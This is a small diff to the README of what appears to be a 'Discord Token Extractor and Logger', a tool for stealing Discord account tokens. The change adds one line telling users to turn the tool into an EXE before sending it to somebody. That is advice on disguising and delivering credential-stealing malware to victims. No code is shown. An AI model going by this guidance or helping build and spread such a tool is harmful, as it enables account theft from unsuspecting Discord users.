@@ -1,4 +1,6 @@
 # Discord Token Extractor and Logger
+## YOU NEED TO MAKE THIS AN EXE FILE BEFORE SENDING IT TO SOMEBODY
+
 
 ## Description
 
